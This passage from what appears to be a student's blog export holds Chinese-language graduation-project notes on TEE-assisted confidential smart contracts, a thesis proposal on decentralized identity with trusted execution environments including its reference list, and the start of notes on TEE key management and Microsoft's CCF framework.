n独立TEE密钥</strong>：每个TEE拥有一个独特密钥，不同合约共享相同的密钥。</li>\n</ul>\n<h2 id=\"一层解决方案\">一层解决方案</h2>\n<p>一层解决方案使区块链节点能够在其隔离区域内运行智能合约，同时进行共识操作（见图3）。该方法将共识过程和状态执行在逻辑或物理层面上结合在一起。之所以称之为“一层”方法，是因为所有的执行都在区块链网络的同一层完成。此方法的关键在于为每个区块链节点配备TEE。这确实需要更多的集成工作，但也带来了几个优势。<u>智能合约可以实现接收参数并即时更新状态的有状态功能。尤其是，智能合约可以直接访问存储在本地磁盘上的账本数据，从而大大节省了通常浪费在交互式网络通信上的时间。</u></p>\n<p>The smart contract can implement stateful functionalities that\nreceive arguments and update states instantly.</p>\n<p>优势：节省网络通信时间。</p>\n<p>此外，我们注意到当前的一层解决方案仅关注内部过程，而忽略了地址和交易的可链接性以及匿名性。这表明保密智能合约只保护加载到TEE中的内容，而与外部用户相关的数据不在该方法的保护范围之内。</p>\n<p>最后，我们分析 TEE\n的密钥管理。在一层系统中，密钥管理服务负责为证明、验证、加密等活动创建和管理密钥。为了在分布式节点之间实现密钥管理服务，提出了几种设计。</p>\n<p><strong>CCF [45]</strong> 依赖于公共密钥基础设施 (PKI)\n来处理证书的颁发、管理和撤销。它创建密钥对并将其分发给每个参与的\nTEE，其中每个 TEE 持有者通过证书进行身份验证。</p>\n<p><strong>Fabric [60]</strong> 采用了一个管理员节点在启动期间为链码\nenclave 提供特定的解密密钥。</p>\n<p><strong>Enigma [61]</strong>\n设置了一个独立的密钥管理组件，用于响应加密请求。</p>\n<p>这些设计有助于简化复杂的管理过程，同时为每个 TEE\n提供独立的密钥。然而，即使这些独立的密钥管理服务由委员会中的一组节点维护，也会导致一定程度的中心化。</p>\n<p><strong>CONFIDE [37]</strong>\n通过提出去中心化密钥管理协议缓解了这一问题。在此协议中涉及两种密钥：</p>\n<p>1.用于解密来自客户端的保密交易的非对称私钥；</p>\n<p>2.在保密引擎和存储服务之间用于状态加密/解密的对称状态根密钥。</p>\n<p>至于<strong>漏洞检测</strong>，根据我们的观察，一层系统中尚未应用任何形式化技术或验证工具。这一空白需要进一步探索。</p>\n<p>一层系统中没有对智能合约的漏洞检查。（截止2022年）通过提前的漏洞检查来预防智能合约可能造成的危害。</p>\n<p>针对 Wasm\n智能合约，可能更容易进行漏洞检查。原来需要分析各种不同的源代码，有了Wasm之后，直接分析目标代码Wasm即可。</p>\n<p>flaw detection</p>\n<p><strong>C. 优缺点</strong></p>\n<p>一层解决方案为保密智能合约提供了一种高度集成的方法。这种方法（L1）保留了大多数区块链特性，例如<strong>高可用性</strong>、<strong>抗回滚攻击</strong>和<strong>去中心化执行</strong>，因为其合约工作流程、数据结构和使用模型与现有系统一致。一层解决方案为用户提供了一个一致的界面，无需改变用户从非TEE区块链系统转变过来的使用习惯。用户可以直接通过区块链界面使用一层系统，而无需考虑TEE和区块链之间繁琐复杂的操作。</p>\n<p>然而，一层解决方案仍然面临一些常见的缺点：</p>\n<ol type=\"1\">\n<li><p><strong>可信计算基（TCB）规模增大</strong>：最小化可信计算基（TCB）的规模有助于增强TEE的安全性[67]，特别是因为较小的TCB具有更少的错误，并能减少攻击面。</p>\n<p>然而，在L1解决方案中，合约执行和共识协议的复杂交互操作大大增加了TCB的规模。</p></li>\n<li><p><strong>TEE的安全内存限制</strong>：</p>\n<p>当前的TEE产品安全内存有限。例如，在Intel SGX\n[35]的当前实现中，Enclave页缓存被限制为128 MB，其中只有93\nMB可用于应用程序。这限制了并发执行的能力。</p></li>\n<li><p><strong>兼容性不足</strong>：</p>\n<p>一层解决方案缺乏与现有区块链系统的兼容性。该方案将共识过程和合约执行集成到同一区块链节点中，要求每个节点都必须配备TEE硬件。</p>\n<p>然而，这一要求难以在已经投入使用的公共区块链（例如以太坊[2]）中实现。</p></li>\n</ol>\n<h2 id=\"二层解决方案\">二层解决方案</h2>\n<p>疑问，二层和一层比能有什么优势？</p>\n<p>智能合约和区块链共识解耦。</p>\n<h2 id=\"总结-1\">总结</h2>\n<p>列举了一层二层的区块链+TEE的解决方案，让我了解了哪些具体的隐私情况适合使用TEE。</p>\n<p>论文里有很多现有方案，用于增强TEE的安全性，增强秘钥管理的安全性。</p>\n<p>并且提供了一个关于智能合约漏洞检测的研究方向。（这两年应该已经有很多先例了，先继续看第三篇论文，之后查智能合约漏洞检测相关的内容）flaw\ndetection</p>\n<p>另一个想法，简单一点，结合数字身份，提出一个系统，利用TEE实现一个更安全、更保护隐私的系统。（感觉在水论文）</p>\n<h1 id=\"sgx-的攻击策略\">3 SGX 的攻击策略</h1>\n<p>一个大纲，各种硬件和系统层面的攻击策略，得先熟悉一点SGX才好看。目前没得到什么启发。</p>\n<h1 id=\"总结-2\">总结</h1>\n<p>之后还是得换个大方向：</p>\n<p>一个方向是智能合约安全</p>\n<p>一个方向是并行计算加速</p>\n<p>可以先把群里那两篇论文看一下，然后去了解一下ethernaut</p>\n<ul>\n<li>原来的出发点绝对有问题\n<ul>\n<li>当时说智能合约 + Wasm + TEE，刚开始误把 Wasm\n当成什么更先进的指令集能加速运算，实际上Wasm的性能是相对于原生Js有很大提升，和C/Rust这些相比是<strong>接近原生的性能</strong>，所以并不能依靠使用Wasm就提高合约执行效率。</li>\n<li>Wasm+智能合约，本质上就是智能合约；TEE+智能合约，是智能合约安全与隐私；这是两个很独立的东西，我说的SC+Wasm+TEE，本质就是SC+TEE，Wasm并没有提供任何优势。</li>\n<li>Wasm智能合约的优势可以是易于开发，易于再各个平台中执行，甚至是在TEE中执行。</li>\n<li>之前看的论文都是侧重智能合约安全，Wasm不能提供什么安全上的帮助</li>\n</ul></li>\n<li>这几天去看了一些智能合约安全的基础知识，一些攻击智能合约的策略；</li>\n<li>之后计划\n<ul>\n<li>毕设继续做，我后续不要太强调Wasm，单纯通过TEE给数字身份系统提升隐私，还是可以的</li>\n<li>Wasm再毕设里可以用于更方便的操作进行TEE操作，简化智能合约和TEE的操作。</li>\n<li>论文之前说的 SC + Wasm + TEE\n实在有问题，这个出发点太强行了，当时不了解，现在算了解这是什么东西了</li>\n<li>之后要么我合约安全？要么做群里发的并行计算的加速；</li>\n</ul></li>\n</ul>\n","categories":["笔记"],"tags":["毕设"]},{"title":"毕设14 - 开题答辩","url":"/graduation-project/14/","content":"<p>写开题答辩。毕业设计切换要点，不是 TEE + Wasm\n了，而侧重于分布式数字身份 + TEE。</p>\n<p>前面毕业实训的东西算是白写了，但是自己是熟悉了 TEE 和\nCosmos，也有作用吧。（自我安慰）</p>\n<p>开题答辩重新把 DID 的东西拿进来。</p>\n<span id=\"more\"></span>\n<h1 id=\"毕业设计论文课题背景\">1 毕业设计（论文）课题背景</h1>\n<p>随着数字化服务的日益发展，用户在数字世界中的身份管理和隐私保护问题成为亟待解决的挑战。传统的身份认证系统大多依赖于中心化服务器，存在单点故障风险，且用户的隐私数据易被不当获取和滥用。为了解决这一问题，分布式数字身份（Decentralized\nIdentity， DID）\n系统应运而生，它利用区块链的去中心化特性，实现了用户对自己身份信息的自主控制。<u>然而，尽管区块链技术一定程度上实现了数字身份的去中心化，但其传统智能合约的透明性，以及存在的诸多安全隐患，影响了分布式数字身份的安全性于可信度。</u></p>\n<p>郑星云同学的本科毕业论文，拟对当前的分布式数字身份系统方案进行基本学习，并结合可信执行环境，对目前分布式数字身份系统进行优化，在提升系统安全性的同时保证运行效率。最终将实现一个基于分布式数字身份的应用场景原型，进一步验证本课题系统的实际可用性和拓展性。</p>\n<h2 id=\"论文选题背景及选题意义\">1.1 论文选题背景及选题意义</h2>\n<h3 id=\"论文选题背景\">1.1.1 论文选题背景</h3>\n<p>随着数字化转型的深入，数字身份管理和隐私保护问题日益突出。同时区块链技术的兴起，给数字身份管理提供了新的解决思路——分布式数字身份。然而现有的分布式数字身份系统仍一定程度上存在着安全性问题，因此提升分布式数字身份系统的安全性与效率成为当前研究的重要方向。</p>\n<h3 id=\"论文选题意义\">1.1.2 论文选题意义</h3>\n<p>本选题的研究内容包括分布式数字身份系统的架构设计、结合可信执行环境对系统安全性进行优化、分布式数字身份系统在可信执行环境中的实现与性能测试等。研究结果将有助于提升分布式数字身份系统的安全性和可信度，为数字身份管理应用提供更加安全、可靠的技术基础。</p>\n<p>分布式数字身份（Decentralized Digital\nIdentity，DID）作为一种新兴的身份认证技术，能够实现用户对自身身份信息的自主控制，减少中心化系统带来的单点故障风险和隐私泄露问题。随着区块链技术的发展，DID系统在各类数字服务中的应用逐渐增多，尤其在金融、医疗和政府等领域，提升了身份管理的安全性和效率。然而，现有的DID系统仍然面临智能合约透明性问题、数据泄露风险及网络攻击等安全隐患。因此，如何通过技术创新提升系统的安全性和可信度，成为当前研究的重要方向。</p>\n<p>可信执行环境（Trusted Execution Environment，\nTEE）作为一种硬件级的安全技术，能够提供隔离的执行环境，确保敏感数据和计算过程的安全性。在DID系统中结合TEE技术，不仅可以有效防止数据泄露和篡改，还能保障智能合约执行的安全性。本研究旨在设计与优化适用于DID系统的TEE架构，提高系统在安全性、效率和可扩展性等方面的表现。通过研究与实现DID系统在TEE中的部署和性能优化，能够进一步提升系统的应用价值，确保用户隐私和身份信息的安全。</p>\n<p>本研究的成果将为数字身份管理提供更加安全、高效的解决方案，推动DID系统的广泛应用，增强其在数字经济时代的竞争力。</p>\n<h2 id=\"国内外研究现状\">1.2 国内外研究现状</h2>\n<p>DID系统的设计与优化是区块链技术与数字身份管理领域的一个重要研究方向。随着数字化服务的广泛应用和对隐私保护的日益重视，数字身份管理在各类应用中的需求不断增加。为了提高DID系统的安全性和效率，研究人员一直在探索结合TEE技术的优化方案。以下是国内外研究现状的分析：</p>\n<p>目前，数字身份的研究经历了从传统的集中式身份认证到分布式身份系统的演变。传统的集中式数字身份依赖于中心化机构进行身份认证，存在隐私泄露和单点故障等风险。为了解决这些问题，联盟身份（如企业间的联合认证）应运而生，但仍然依赖于中心化的信任机构。近年来，DID作为一种去中心化的身份管理方式，逐渐成为研究热点。W3C（万维网联盟）牵头制定了DID标准，为数字身份提供了开放、透明的技术框架，支持用户自主控制其身份信息。DID的优势在于其去中心化特性，能够有效减少对第三方机构的依赖，提升隐私保护和系统安全性。</p>\n<p>TEE是一种通过硬件隔离保护敏感数据和计算的安全技术。Intel SGX和Arm\nTrustZone是两种主流的TEE技术。Intel\nSGX通过创建受保护的“安全区域”保护应用执行，而Arm\nTrustZone将处理器分为信任和非信任区域，确保数据安全。两者在保护数字身份和敏感信息方面具有重要应用。</p>\n<p>在全球范围内，DID技术正得到快速应用和落地实施。美国的互联网巨头和初创企业已率先利用DID实现跨系统的身份认证和数字资产交易，微软、IBM、区块链联盟R3、埃森哲等103家企业和机构已完成DID系统的实现与应用。英国的奥卡姆公司设计了基于区块链的物联网设备身份平台，推动设备间的身份认证和数据互操作。此外，各国企业积极联合成立DID相关基金会和产业联盟，如Linux\nFoundation、Sovrin Foundation和SSI\nMeetup，推动产业生态的建设。在中国，百度、微众银行、中国信息通信研究院等单位已自主研发DID产品和解决方案，并成功注册于W3C相关标准，成为全球DID方案的一部分。中国信息通信研究院牵头搭建了国内最大的DID工程化平台“星火·链网”，华为也基于DID技术构建了其分布式身份服务平台TDIS，推动了国内DID体系的建设与应用。</p>\n<h3 id=\"区块链技术\">1.2.1 区块链技术</h3>\n<p>区块链技术作为DID系统的基础，为数据存储和管理提供了可靠的支持。通过其分布式、不可篡改和透明的特性，区块链确保了身份数据的安全性和完整性。</p>\n<p>区块链的分布式特性使得所有节点共同维护账本，避免了单点故障的风险。每个节点持有账本的完整副本，确保了数据的高可用性和可靠性。不可篡改性是区块链的核心优势之一，每个区块都包含前一个区块的哈希值，形成链式结构，任何篡改都需同时修改所有后续区块，几乎无法实现。此外，通过加密技术和哈希函数，区块链保证了数据的完整性。</p>\n<p>智能合约是区块链技术的另一个重要应用，它通过数字化的协议自动执行合约条款，无需中介机构的参与。智能合约代码由特定编程语言（如Solidity、Go、JavaScript等）编写，并部署到区块链上。合约的内容和状态一旦部署，便成为不可篡改的一部分。智能合约可以在特定条件下自动执行相关操作，并将执行结果记录在区块链中，确保透明性和不可篡改性。</p>\n<h3 id=\"数字身份技术\">1.2.2 数字身份技术</h3>\n<p>&lt;留着，把那论文里的几个&gt;（备选，可以修改成论文里集中分布式数字身份的现有系统）</p>\n<p>传统的数字身份系统采用中心化和集中化的管理模式，用户身份信息存储在少数几个服务器上，由服务提供商统一管理。这种模式存在一些问题：（1）单点故障：若服务器出现故障或遭遇攻击，整个系统的安全性和可用性会受到影响；（2）隐私风险：集中存储的用户信息容易成为攻击目标，一旦泄露，用户隐私将面临严重威胁；（3）信任问题：用户必须完全信任身份提供者，但提供者可能滥用数据；（4）数据孤岛：不同平台之间缺乏互操作性，用户需重复注册，增加了管理负担。</p>\n<p>为了克服这些问题，联盟身份应运而生。联盟身份通过区块链技术将身份数据分散存储在多个独立组织的节点上，避免了单点故障，并提高了系统的安全性和可靠性。用户的数字身份可以在多个成员组织之间共享和验证，解决了重复注册的问题，同时增强了隐私保护。然而，联盟身份也面临一些挑战：（1）数据垄断：联盟中的中心节点可能掌握大量用户信息，存在隐私泄露的风险；（2）隐私风险：多个组织共享用户身份信息，一旦某个节点遭遇攻击，用户隐私可能被泄露；（3）数据集中：尽管解决了互操作性问题，但数据过度集中于联盟成员，增加了系统的安全风险。</p>\n<p>分布式数字身份（Decentralized Digital\nIdentity）是基于区块链和分布式账本技术的新型身份管理模式。在这种模式下，身份数据分散存储在分布式网络中，利用密码学技术和共识机制确保数据的安全性和不可篡改性。分布式数字身份相比于传统的中心化身份和联盟身份，具有明显优势：（1）隐私安全：身份数据通过加密保护，用户可以选择性披露信息，避免隐私泄露；（2）身份自主管理：用户对身份数据拥有完全的控制权，无需依赖第三方机构；（3）身份可移植性：用户的身份不依赖于特定服务提供商，可以在不同平台之间自由迁移；（4）可信数据交换：区块链技术保证数据的完整性和不可篡改性，确保身份数据交换的可信度。</p>\n<h3 id=\"可信执行环境\">1.2.3 可信执行环境</h3>\n<p>可信执行环境（TEE）是一种通过硬件隔离的安全计算环境，专门用于保护敏感数据和计算过程的机密性与完整性。在TEE中，应用程序可以在“安全世界”中运行，这个区域与常规操作系统隔离，避免了不受信的环境对敏感信息的访问或篡改。通过这种方式，TEE能够防止恶意软件和攻击者窃取或篡改数据，广泛应用于数字身份保护、支付安全、加密操作等领域。</p>\n<p>Arm\nTrustZone是目前应用最广泛的TEE实现之一。TrustZone将处理器划分为两个区域：安全世界和非安全世界。安全世界提供一个受保护的执行环境，运行敏感任务和存储重要数据，而非安全世界则执行普通任务和运行非敏感应用。通过硬件级别的隔离，TrustZone有效确保即使非安全世界受到攻击，安全世界中的数据和代码也不会受到影响。TrustZone的低开销和高效性使其在移动设备和嵌入式设备中得到了广泛应用，能够为各种安全功能提供支持，如加密、身份验证、数字签名等。</p>\n<p>然而，TrustZone并非没有局限性。虽然它能够提供硬件隔离，但其安全性和性能表现依赖于底层硬件和固件的质量。如果硬件或固件存在漏洞，整个TEE的安全性就会受到威胁。此外，TrustZone的安全世界与非安全世界之间的上下文切换可能会对系统性能产生一定的影响。</p>\n<p>为了更好地支持和管理TEE环境，特别是在开源和嵌入式系统中，OP-TEE（Open\nPortable Trusted Execution\nEnvironment）应运而生。OP-TEE是一个开源的、基于Arm\nTrustZone的TEE实现，它为开发人员提供了一个灵活、可定制的安全环境。OP-TEE通过为应用程序提供可信的执行环境，确保敏感操作如密钥管理、数字签名、加密解密等可以在受保护的环境中进行，而不暴露给不受信的操作系统或应用程序。</p>\n<p>总结来说，Arm\nTrustZone和OP-TEE作为目前最常见的TEE实现，通过硬件隔离和受保护的执行环境，有效提升了数据安全性，防止了数据泄露和恶意篡改。虽然存在一定的局限性和性能开销，但其在安全性和灵活性上的优势使其成为保护敏感数据和计算过程的重要工具。</p>\n<h1 id=\"毕业设计方案介绍\">2 毕业设计方案介绍</h1>\n<h2 id=\"论文研究目标\">2.1 论文研究目标</h2>\n<p>本研究的主要目标是优化分布式数字身份系统，结合可信执行环境提升系统的安全性与效率。首先，深入理解分布式数字身份系统的原理，分析现有系统的不足；其次，研究可信执行环境的技术，设计一种能够提升分布式数字身份系统安全性的优化方案；最后，在可信执行环境中实现并测试该系统，验证其安全性和性能，确保其在实际应用中的可行性和高效性。</p>\n<h2 id=\"论文研究内容\">2.2 论文研究内容</h2>\n<p>本研究主要分为四个部分。</p>\n<p>首先，研究分布式数字身份系统的原理，分析现有数字身份技术的优缺点，重点讨论区块链技术在数字身份系统中的应用，以及TEE如何提升系统的安全性。将深入理解当前系统方案，并识别其中的安全隐患。</p>\n<p>然后，学习并理解可信执行环境的工作原理，重点研究Intel SGX和Arm\nTrustZone等技术。探讨如何将这些技术应用于分布式数字身份系统中，以提高数据安全性和身份验证的可信度。</p>\n<p>接下来，进行系统优化设计，结合可信执行环境对分布式数字身份系统进行性能优化，确保在提升安全性的同时不影响系统的运行效率。此部分将涉及对不同系统架构的分析和性能调优。</p>\n<p>最后，将在实际环境中进行系统实现和性能测试，包括对不同设备和平台下系统的可行性验证、性能评估以及结果分析，确保优化后的系统能够在实际应用中高效、安全地运行。</p>\n<h2 id=\"论文拟采取的研究方法技术路线\">2.3\n论文拟采取的研究方法、技术路线</h2>\n<p>（1）文献调研：为了深入理解分布式数字身份系统的相关技术，将查阅国内外关于区块链技术、数字身份管理、可信执行环境（TEE）等领域的文献。重点学习和掌握当前主流的分布式数字身份系统架构、协议及其优缺点，并分析可信执行环境如何增强系统的安全性。</p>\n<p>（2）技术调研与方案分析：调研当前市场上主流的分布式数字身份系统方案及其安全机制，重点分析区块链技术（如Ethereum、Hyperledger、Cosmos等）和可信执行环境（如Intel\nSGX、Arm\nTrustZone等）在实际应用中的实现方式与挑战。对比不同方案的性能、可扩展性与安全性，为优化设计提供技术参考。</p>\n<p>（3）系统架构设计：根据调研结果，设计分布式数字身份系统的架构，结合可信执行环境（TEE）对系统进行优化。在设计过程中，将考虑系统的安全性、隐私保护、可扩展性等多方面因素，并明确具体的技术实现路线和安全优化措施。</p>\n<p>（4）实验与性能测试：在可信执行环境中实现优化后的分布式数字身份系统，进行实际测试与性能评估。通过创建测试用例和数据集，验证系统在不同场景下的安全性、效率和可靠性。对系统进行性能调优，确保其在不同硬件和平台上的表现符合预期要求。</p>\n<p>（5）系统实现与应用验证：将设计的系统进行落地实现，针对实际应用场景进行验证。通过对比不同设备和环境下的性能表现，进一步优化系统架构，确保分布式数字身份系统能够高效、安全地在实际环境中运行，并验证其实际可行性和拓展性。</p>\n<h1 id=\"参考文献\">3 参考文献</h1>\n<p>毕丹阳, 景越, 李婧璇, 李海花. (2021).\n分布式数字身份及其在工业互联网中的应用. 信息通信技术与政策,\n<em>2021(10)</em>, 7–12.</p>\n<p>冉津豪, &amp; 蔡栋梁. (2023).\n基于区块链和可信执行环境的属性签名身份认证方案. 计算机研究与发展,\n<em>60</em>(11), 2555–2566.</p>\n<p>帅峰云, 黄腾, &amp; 宋洋. (2018).\n<em>手机安全与可信应用开发指南：TrustZone和OP-TEE技术详解</em>.\n机械工业出版社.</p>\n<p>Androulaki, E., Barger, A., Bortnikov, V., Cachin, C., Christidis,\nK., De Caro, A., Enyeart, D., Ferris, C., Laventman, G., Manevich, Y.,\nMuralidharan, S., Murthy, C., Nguyen, B., Sethi, M., Singh, G., Smith,\nK., Sorniotti, A., Stathakopoulou, C., Vukolić, M., … Yellick, J.\n(2018). Hyperledger fabric: A distributed operating system for\npermissioned blockchains. <em>Proceedings of the Thirteenth EuroSys\nConference</em>, 1–15. https://doi.org/10.1145/3190508.3190538</p>\n<p>Costan, V., &amp; Devadas, S. (2016). <em>Intel SGX Explained</em>\n(No. 2016/086). Cryptology ePrint Archive.\nhttps://eprint.iacr.org/2016/086</p>\n<p><em>Decentralized Identifiers (DIDs) v1.0</em>. (不详). 取读于\n2024年12月1日, 从 https://www.w3.org/TR/did-core/</p>\n<p>Dib, O., &amp; Rababah, B. (2020). Decentralized Identity Systems:\nArchitecture, Challenges, Solutions and Future Directions. <em>Annals of\nEmerging Technologies in Computing (AETiC)</em>, <em>4</em>(5), Article\n5. https://doi.org/10.33166/AETiC.2020.05.002</p>\n<p>Fynn, E., Bessani, A., &amp; Pedone, F. (2020). <em>Smart Contracts\non the Move</em> (No. arXiv:2004.05933). arXiv.\nhttps://doi.org/10.48550/arXiv.2004.05933</p>\n<p>Jian, Z., Lu, Y., Qiao, Y., Fang, Y., Xie, X., Yang, D., Zhou, Z.,\n&amp; Li, T. (2023). TSC-VEE: A TrustZone-Based Smart Contract Virtual\nExecution Environment. <em>IEEE Transactions on Parallel and Distributed\nSystems</em>, <em>34</em>(6), 1773–1788. IEEE Transactions on Parallel\nand Distributed Systems. https://doi.org/10.1109/TPDS.2023.3263882</p>\n<p>Kwon, J., &amp; Buchman, E. (2020, 十二月 29). <em>Cosmos\nWhitepaper</em>.\nhttps://wikibitimg.fx994.com/attach/2020/12/16623142020/WBE16623142020_55300.pdf</p>\n<p>Li, R., Wang, Q., Wang, Q., Galindo, D., &amp; Ryan, M. (2022).\n<em>SoK: TEE-assisted Confidential Smart Contract</em> (No.\narXiv:2203.08548). arXiv. https://doi.org/10.48550/arXiv.2203.08548</p>\n<p>Liu, C., Guo, H., Xu, M., Wang, S., Yu, D., Yu, J., &amp; Cheng, X.\n(2022). Extending On-Chain Trust to Off-Chain – Trustworthy Blockchain\nData Collection Using Trusted Execution Environment (TEE). <em>IEEE\nTransactions on Computers</em>, <em>71</em>(12), 3268–3280. IEEE\nTransactions on Computers. https://doi.org/10.1109/TC.2022.3148379</p>\n<p>Maldonado-Ruiz, D., Torres, J., El Madhoun, N., &amp; Badra, M.\n(2021). An Innovative and Decentralized Identity Framework Based on\nBlockchain Technology. <em>2021 11th IFIP International Conference on\nNew Technologies, Mobility and Security (NTMS)</em>, 1–8.\nhttps://doi.org/10.1109/NTMS49979.2021.9432656</p>\n<p>Mohanta, B. K., Panda, S. S., &amp; Jena, D. (2018). An Overview of\nSmart Contract and Use Cases in Blockchain Technology. <em>2018 9th\nInternational Conference on Computing, Communication and Networking\nTechnologies (ICCCNT)</em>, 1–4.\nhttps://doi.org/10.1109/ICCCNT.2018.8494045</p>\n<p>Mukhtar, M. A., Bhatti, M. K., &amp; Gogniat, G. (2019).\nArchitectures for Security: A comparative analysis of hardware security\nfeatures in Intel SGX and ARM TrustZone. <em>2019 2nd International\nConference on Communication, Computing and Digital systems\n(C-CODE)</em>, 299–304. https://doi.org/10.1109/C-CODE.2019.8680982</p>\n<p>Nehal, A., &amp; Ahlawat, P. (2019). Securing IoT applications with\nOP-TEE from hardware level OS. <em>2019 3rd International conference on\nElectronics, Communication and Aerospace Technology (ICECA)</em>,\n1441–1444. https://doi.org/10.1109/ICECA.2019.8822040</p>\n<p><em>OP-TEE/optee_os</em>. (2024). [C]. OP-TEE.\nhttps://github.com/OP-TEE/optee_os (Original work published 2014)</p>\n<p>Pinto, S., &amp; Santos, N. (2019). Demystifying Arm TrustZone: A\nComprehensive Survey. <em>ACM Comput. Surv.</em>, <em>51</em>(6),\n130:1-130:36. https://doi.org/10.1145/3291047</p>\n<p>Ramić, Š. B., Prazina, I., Pozderac, D., Mulahasanović, R. T., &amp;\nMrdović, S. (2024). <em>Selective disclosure of claims from multiple\ndigital credentials</em> (No. arXiv:2402.15447). arXiv.\nhttps://doi.org/10.48550/arXiv.2402.15447</p>\n<p>Ren, M., Yin, Z., Ma, F., Xu, Z., Jiang, Y., Sun, C., Li, H., &amp;\nCai, Y. (2021). Empirical evaluation of smart contract testing: What is\nthe best choice? <em>Proceedings of the 30th ACM SIGSOFT International\nSymposium on Software Testing and Analysis</em>, 566–579.\nhttps://doi.org/10.1145/3460319.3464837</p>\n<p>Rouhani, S., &amp; Deters, R. (2019). Security, Performance, and\nApplications of Smart Contracts: A Systematic Survey. <em>IEEE\nAccess</em>, <em>7</em>, 50759–50779. IEEE Access.\nhttps://doi.org/10.1109/ACCESS.2019.2911031</p>\n<p>Van Schaik, S., Seto, A., Yurek, T., Batori, A., AlBassam, B.,\nGenkin, D., Miller, A., Ronen, E., Yarom, Y., &amp; Garman, C. (2024).\nSoK: SGX.Fail: How Stuff Gets eXposed. <em>2024 IEEE Symposium on\nSecurity and Privacy (SP)</em>, 4143–4162.\nhttps://doi.org/10.1109/SP54263.2024.00260</p>\n<p><em>Verifiable Credentials Data Model v1.1</em>. (不详). 取读于\n2024年12月1日, 从 https://www.w3.org/TR/vc-data-model/</p>\n<p>Zichichi, M., Bomprezzi, C., Sorrentino, G., &amp; Palmirani, M.\n(2023). <em>Protecting digital identity in the Metaverse: The case of\naccess to a cinema in Decentraland</em>. International Conference on\nDevelopments in Language Theory.\nhttps://www.semanticscholar.org/paper/Protecting-digital-identity-in-the-Metaverse%3A-the-a-Zichichi-Bomprezzi/9df5f7d524a39db1781abd394a0a5a4b1eec31d1</p>\n<p>Zou, W., Lo, D., Kochhar, P. S., Le, X.-B. D., Xia, X., Feng, Y.,\nChen, Z., &amp; Xu, B. (2021). Smart Contract Development: Challenges\nand Opportunities. <em>IEEE Transactions on Software Engineering</em>,\n<em>47</em>(10), 2084–2106. IEEE Transactions on Software Engineering.\nhttps://doi.org/10.1109/TSE.2019.2942301</p>\n<h1 id=\"ppt\">PPT</h1>\n<p>目录：</p>\n<ul>\n<li>选题背景及意义</li>\n<li>国内外研究现状</li>\n<li>主要研究内容</li>\n<li>时间及工作安排</li>\n</ul>\n","categories":["笔记"],"tags":["毕设","答辩"]},{"title":"毕设15 - 秘钥管理方案","url":"/graduation-project/15(TODO)/","content":"<h1 id=\"前言\">0 前言</h1>\n<p>回家了，想一下后续的工作吧。</p>\n<p>之前纯粹把 Wasm + TEE\n做创新点的思路肯定不好走，之后先跟老师说了这个问题先。</p>\n<p>毕业设计我就把题目重点换成了数字身份 +\nTEE，学校老师评价也是工作量肯定很够，但感觉缺乏创新点。我思路就是把所有隐私数据，包括智能合约的字节码，都用公钥加密后存储，私钥只存储在TEE里。</p>\n<p>然后还有，上次看的几篇论文里，提到的秘钥管理方案，可以再深入看一看。</p>\n<p>但是这样感觉创新也不大，工作量是有了……大多数框架设计也还是别人的。</p>\n<p>另外凑巧看到一篇，跨链 + 数字身份……之后可以看下跨链的内容……</p>\n<span id=\"more\"></span>\n<p>论文都有点年头了……之后可以看看最新的研究方向是什么</p>\n<blockquote>\n<p><strong>CCF [45]</strong> 依赖于公共密钥基础设施 (PKI)\n来处理证书的颁发、管理和撤销。它创建密钥对并将其分发给每个参与的\nTEE，其中每个 TEE 持有者通过证书进行身份验证。</p>\n<p>Mark Russinovich et al. Ccf: A framework for building confidential\nverifiable replicated services. Technical Report MSR-TR-2019-16,\nMicrosoft, April 2019.</p>\n<p><strong>Fabric [60]</strong> 采用了一个管理员节点在启动期间为链码\nenclave 提供特定的解密密钥。</p>\n<p>Marcus Brandenburger et al. Blockchain and trusted computing:\nProblems, pitfalls, and a solution for hyperledger fabric. arXiv\npreprint arXiv:1805.08541, 2018.</p>\n<p><strong>Enigma [61]</strong>\n设置了一个独立的密钥管理组件，用于响应加密请求。</p>\n<p>Enigma – securing the decentralized web. https:// www.enigma.co/\n.（这网站都没了）</p>\n<p><strong>CONFIDE [37]</strong>\n通过提出去中心化密钥管理协议缓解了这一问题。在此协议中涉及两种密钥：</p>\n<p>Ying Yan, Changzheng Wei, et al. Confidentiality support over\nfinancial grade consortium blockchain. In SIGMOD, pages 2227–2240,\n2020.</p>\n</blockquote>\n<h1 id=\"ccf-机密联盟框架todo\">1 CCF 机密联盟框架(TODO)</h1>\n<blockquote>\n<p>Mark Russinovich et al. Ccf: A framework for building confidential\nverifiable replicated services. Technical Report MSR-TR-2019-16,\nMicrosoft, April 2019.</p>\n</blockquote>\n<blockquote>\n<p>看到一半被叫走了，先去看 decentraland</p>\n</blockquote>\n<p>这篇论文介绍了 <strong>CCF（Confidential Consortium\nFramework）</strong>，一个用于构建<strong>许可型机密区块链</strong>的框架。CCF\n旨在解决现有区块链设计在<strong>机密性</strong>和<strong>性能</strong>方面的不足，特别是针对联盟链（consortium-based\nblockchains）的应用场景。以下是论文的主要内容和贡献的详细讲解：</p>\n<h3 id=\"背景与动机\">1. <strong>背景与动机</strong></h3>\n<ul>\n<li><strong>现有区块链的局限性</strong>：当前的区块链设计（如比特币和以太坊）在<strong>交易吞吐量</strong>和<strong>延迟</strong>方面表现不佳。例如，比特币需要大约一小时才能确认交易，而以太坊每秒只能处理约10笔交易。此外，现有的区块链设计通常缺乏<strong>机密性</strong>，所有交易和智能合约的代码都是公开的。</li>\n<li><strong>联盟链的优势</strong>：联盟链通过依赖一个稳定的成员联盟来管理区块链的治理，能够显著提高效率。然而，现有的联盟链设计要么不提供机密性，要么性能较低（如每秒仅处理4笔交易）。</li>\n<li><strong>CCF的目标</strong>：CCF旨在提供一个既能保证<strong>机密性</strong>，又能实现<strong>高性能</strong>的联盟链框架。它通过使用<strong>硬件保护的可信执行环境（TEE）</strong>来实现这一目标。</li>\n</ul>\n<h3 id=\"ccf的核心设计\">2. 